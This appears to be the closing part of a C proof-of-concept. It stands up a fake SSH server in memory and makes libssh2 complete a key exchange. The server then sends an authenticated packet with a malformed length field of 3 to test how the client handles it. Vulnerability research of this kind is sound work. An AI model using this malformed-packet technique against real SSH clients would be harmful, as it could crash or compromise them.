        printf("[poc] negotiated crypt: %s\n", SRV_CRYPT);
        printf("[poc] sent NEWKEYS and an authenticated packet whose"
               " length field is 3\n");
        fflush(stdout);
        free(kex_alg);
    }

fail:
    free(hostkey_alg);
    free(reply.p);
    free(fbuf.p);
    free(kbuf.p);
    free(server_kexinit.p);
    free(sig);
    EVP_MD_CTX_free(md);
    BN_free(p); BN_free(g); BN_free(x); BN_free(e); BN_free(f); BN_free(k);
    BN_CTX_free(bctx);
    g_srv.session_k = NULL;
    g_srv.state = ST_DONE;
}

static void server_pump(void)
{
    for(;;) {
        const unsigned char *pl;
        size_t plen;

        if(g_srv.state == ST_BANNER) {
            unsigned char *nl = memchr(g_srv.in.p, '\n', g_srv.in.len);
            size_t blen;
            if(!nl)
                return;
            blen = (size_t)(nl - g_srv.in.p);
            if(blen && g_srv.in.p[blen - 1] == '\r')
                blen--;
            if(blen >= sizeof(g_srv.client_banner))
                blen = sizeof(g_srv.client_banner) - 1;
            memcpy(g_srv.client_banner, g_srv.in.p, blen);
            g_srv.client_banner[blen] = '\0';
            buf_drop(&g_srv.in, (size_t)(nl - g_srv.in.p) + 1);
            g_srv.state = ST_KEXINIT;
            continue;
        }

        if(g_srv.state == ST_KEXINIT) {
            if(!read_client_packet(&pl, &plen))
                return;
            if(plen >= 1 && pl[0] == SSH_MSG_KEXINIT) {
                if(plen > sizeof(g_srv.client_kexinit))
                    plen = sizeof(g_srv.client_kexinit);
                memcpy(g_srv.client_kexinit, pl, plen);
                g_srv.client_kexinit_len = plen;
                parse_kexinit_lists(pl, plen);
                send_server_kexinit();
                g_srv.state = ST_KEXDH;
            }
            continue;
        }

        if(g_srv.state == ST_KEXDH) {
            if(!read_client_packet(&pl, &plen))
                return;
            if(plen >= 1 && pl[0] == SSH_MSG_KEXDH_INIT)
                finish_kex(pl, plen);
            continue;
        }

        /* ST_DONE: swallow whatever the client still sends */
        buf_drop(&g_srv.in, g_srv.in.len);
        return;
    }
}

/* ------------------------------------------------------------------ */
/* libssh2 transport callbacks                                         */

static ssize_t poc_recv(libssh2_socket_t socket, void *buffer,
                        size_t length, int flags, void **abstract)
{
    size_t n;
    (void)socket; (void)flags; (void)abstract;

    server_pump();
    n = g_srv.out.len < length ? g_srv.out.len : length;
    if(!n)
        return 0;  /* nothing more will ever arrive */
    memcpy(buffer, g_srv.out.p, n);
    buf_drop(&g_srv.out, n);
    return (ssize_t)n;
}

static ssize_t poc_send(libssh2_socket_t socket,
                        const void *buffer, size_t length, int flags,
                        void **abstract)
{
    (void)socket; (void)flags; (void)abstract;
    buf_put(&g_srv.in, buffer, length);
    server_pump();
    return (ssize_t)length;
}

int main(void)
{
    int fds[2] = { -1, -1 };
    setvbuf(stdout, NULL, _IONBF, 0);
    LIBSSH2_SESSION *session = NULL;
    int rc;
    char *msg;

    {
        EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
        if(!kctx || EVP_PKEY_keygen_init(kctx) != 1 ||
           EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048) <= 0 ||
           EVP_PKEY_keygen(kctx, &g_srv.rsa) != 1)
            g_srv.rsa = NULL;
        EVP_PKEY_CTX_free(kctx);
    }
    if(!g_srv.rsa) {
        fprintf(stderr, "failed to generate host key\n");
        return 2;
    }
    build_hostkey_blob();

    /* the server greets first */
    buf_put(&g_srv.out, SRV_BANNER, strlen(SRV_BANNER));
    buf_put(&g_srv.out, "\r\n", 2);

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds)) {
        perror("socketpair");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 2;
    }
    libssh2_session_set_blocking(session, 1);
    libssh2_session_callback_set2(session, LIBSSH2_CALLBACK_RECV,
                                  (libssh2_cb_generic *)poc_recv);
    libssh2_session_callback_set2(session, LIBSSH2_CALLBACK_SEND,
                                  (libssh2_cb_generic *)poc_send);

    rc = libssh2_session_handshake(session, fds[0]);
    if(rc) {
        libssh2_session_last_error(session, &msg, NULL, 0);
        printf("[poc] handshake rejected the malformed packet: %s\n", msg);
    }
    else {
        printf("[poc] handshake completed\n");
    }

    libssh2_session_disconnect(session, "done");
    libssh2_session_free(session);
    libssh2_exit();
    close(fds[0]);
    close(fds[1]);
    return 0;
}
